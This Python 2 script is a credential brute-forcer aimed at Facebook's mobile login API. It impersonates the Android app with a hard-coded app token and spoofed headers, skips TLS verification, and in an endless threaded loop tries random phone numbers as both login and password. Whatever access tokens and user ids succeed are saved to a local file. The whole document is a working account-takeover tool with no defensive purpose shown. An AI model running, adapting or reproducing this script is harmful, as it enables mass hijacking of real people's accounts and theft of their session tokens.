import requests
from random import randint
import string
import random
import urllib
import StringIO
import gzip
import json
import time
import thread



def random_machine_id():
	return ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(24))


def startbrute(number, ss):
	data = {
		'batch': '[{"method":"POST","body":"format=json&device_id=0cd272a7-17dc-4766-958e-5b48799250bf&email=2'+number+'&password='+number+'&credentials_type=password&generate_session_cookies=1&error_detail_type=button_with_disabled&machine_id='+random_machine_id()+'&locale=en_US&client_country_code=US&fb_api_req_friendly_name=authenticate","name":"authenticate","omit_response_on_success":false,"relative_url":"method/auth.login"},{"method":"POST","body":"query_id=10153437257771729&method=get&strip_nulls=true&query_params=%7B%220%22%3A75%2C%221%22%3A120%2C%222%22%3A480%7D&locale=en_US&client_country_code=US&fb_api_req_friendly_name=GetLoggedInUserQuery","name":"getLoggedInUser","depends_on":"authenticate","omit_response_on_success":false,"relative_url":"graphql?access_token={result=authenticate:$.access_token}"}]',
		'fb_api_caller_class': 'com.facebook.katana.server.handler.Fb4aAuthHandler',
		'fb_api_req_friendly_name': 'authLogin'
	}
	headers = {
		'Authorization' : 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
		'X-Fb-Connection-Type' : 'mobile.LTE',
		'X-Fb-Net-Hni' : '310260',
		'X-Fb-Sim-Hni' : '310260',
		'X-Fb-Net-Sid' : '',
		'X-Fb-Http-Engine' : 'Apache',
		'Content-Type' : 'application/x-www-form-urlencoded',
		'Content-Encoding' : 'gzip',
		'User-Agent' : '[FBAN/FB4A;FBAV/37.0.0.0.109;FBBV/11557663;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Android;FBMF/unknown;FBBD/generic;FBPN/com.facebook.katana;FBDV/google_sdk;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	}
	out = StringIO.StringIO()
	with gzip.GzipFile(fileobj=out, mode="w") as f:
	  f.write(urllib.urlencode(data))
	r = requests.post("https://b-graph.facebook.com/?include_headers=false&locale=en_US&client_country_code=US", headers=headers, data=out.getvalue(), verify=False)
	if 'access_token' in json.loads(r.json()[0]['body']):
		f = open("accss", "a+")
		f.write(number + ":" + json.loads(r.json()[0]['body'])['access_token'] + ":" + str(json.loads(r.json()[0]['body'])['uid']) + "\n")
		f.close()


while True:
        number = "0" + str(random.randint(10,12)) + str(random.randint(10000000,99999999))
        print number
	thread.start_new_thread( startbrute, (number, 4, ) )
	time.sleep(0.15)